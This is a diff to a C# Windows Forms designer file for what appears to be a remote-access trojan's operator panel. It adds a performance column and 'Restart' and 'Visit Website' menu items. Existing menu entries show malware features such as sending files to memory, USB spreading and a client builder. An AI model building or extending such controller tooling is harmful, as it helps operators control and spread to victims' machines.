@@ -37,12 +37,15 @@
             this.lv_user = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lv_version = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.lv_prefor = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.cLIENTOPTIONSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.cLOSEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.rESTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uPDATEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uNISTALLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
+            this.vISITWEBSITEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sENDMESSAGEBOXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sENDFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sENDFILETOMEMORYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -84,7 +87,8 @@
             this.lv_hwid,
             this.lv_user,
             this.lv_os,
-            this.lv_version});
+            this.lv_version,
+            this.lv_prefor});
             this.listView1.ContextMenuStrip = this.contextMenuStrip1;
             this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
             this.listView1.FullRowSelect = true;
@@ -122,7 +126,7 @@
             // 
             // lv_os
             // 
-            this.lv_os.Text = "OS";
+            this.lv_os.Text = "OPERATING SYSTEM";
             this.lv_os.Width = 179;
             // 
             // lv_version
@@ -130,12 +134,18 @@
             this.lv_version.Text = "VERSION";
             this.lv_version.Width = 126;
             // 
+            // lv_prefor
+            // 
+            this.lv_prefor.Text = "PERFORMANCE";
+            this.lv_prefor.Width = 170;
+            // 
             // contextMenuStrip1
             // 
             this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
             this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.cLIENTOPTIONSToolStripMenuItem,
             this.toolStripSeparator1,
+            this.vISITWEBSITEToolStripMenuItem,
             this.sENDMESSAGEBOXToolStripMenuItem,
             this.sENDFILEToolStripMenuItem,
             this.sENDFILETOMEMORYToolStripMenuItem,
@@ -149,12 +159,13 @@
             this.bUILDERToolStripMenuItem});
             this.contextMenuStrip1.Name = "contextMenuStrip1";
             this.contextMenuStrip1.ShowImageMargin = false;
-            this.contextMenuStrip1.Size = new System.Drawing.Size(275, 346);
+            this.contextMenuStrip1.Size = new System.Drawing.Size(275, 376);
             // 
             // cLIENTOPTIONSToolStripMenuItem
             // 
             this.cLIENTOPTIONSToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.cLOSEToolStripMenuItem,
+            this.rESTARTToolStripMenuItem,
             this.uPDATEToolStripMenuItem,
             this.uNISTALLToolStripMenuItem});
             this.cLIENTOPTIONSToolStripMenuItem.Name = "cLIENTOPTIONSToolStripMenuItem";
@@ -167,6 +178,13 @@
             this.cLOSEToolStripMenuItem.Size = new System.Drawing.Size(173, 30);
             this.cLOSEToolStripMenuItem.Text = "CLOSE";
             this.cLOSEToolStripMenuItem.Click += new System.EventHandler(this.cLOSEToolStripMenuItem_Click);
+            // 
+            // rESTARTToolStripMenuItem
+            // 
+            this.rESTARTToolStripMenuItem.Name = "rESTARTToolStripMenuItem";
+            this.rESTARTToolStripMenuItem.Size = new System.Drawing.Size(173, 30);
+            this.rESTARTToolStripMenuItem.Text = "RESTART";
+            this.rESTARTToolStripMenuItem.Click += new System.EventHandler(this.RESTARTToolStripMenuItem_Click);
             // 
             // uPDATEToolStripMenuItem
             // 
@@ -186,6 +204,13 @@
             // 
             this.toolStripSeparator1.Name = "toolStripSeparator1";
             this.toolStripSeparator1.Size = new System.Drawing.Size(271, 6);
+            // 
+            // vISITWEBSITEToolStripMenuItem
+            // 
+            this.vISITWEBSITEToolStripMenuItem.Name = "vISITWEBSITEToolStripMenuItem";
+            this.vISITWEBSITEToolStripMenuItem.Size = new System.Drawing.Size(274, 30);
+            this.vISITWEBSITEToolStripMenuItem.Text = "[0] VISIT WEBSITE";
+            this.vISITWEBSITEToolStripMenuItem.Click += new System.EventHandler(this.VISITWEBSITEToolStripMenuItem_Click);
             // 
             // sENDMESSAGEBOXToolStripMenuItem
             // 
@@ -351,7 +376,7 @@
             // columnHeader2
             // 
             this.columnHeader2.Text = "Message";
-            this.columnHeader2.Width = 500;
+            this.columnHeader2.Width = 705;
             // 
             // performanceCounter1
             // 
@@ -428,6 +453,9 @@
         private System.Windows.Forms.ToolStripMenuItem uSBSPREADToolStripMenuItem;
         private System.Diagnostics.PerformanceCounter performanceCounter1;
         private System.Diagnostics.PerformanceCounter performanceCounter2;
+        private System.Windows.Forms.ToolStripMenuItem vISITWEBSITEToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem rESTARTToolStripMenuItem;
+        public System.Windows.Forms.ColumnHeader lv_prefor;
     }
 }
 
